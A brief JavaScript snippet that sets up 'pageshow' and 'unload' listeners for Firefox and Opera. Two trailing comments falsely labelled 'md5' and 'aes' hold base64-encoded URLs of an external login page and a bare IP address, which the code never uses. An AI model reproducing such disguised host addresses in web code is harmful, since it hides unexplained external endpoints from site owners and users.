if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly9tcXg2LmNvbS9ob21lL2xvZ2luL2luZGV4Lmh0bWw=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/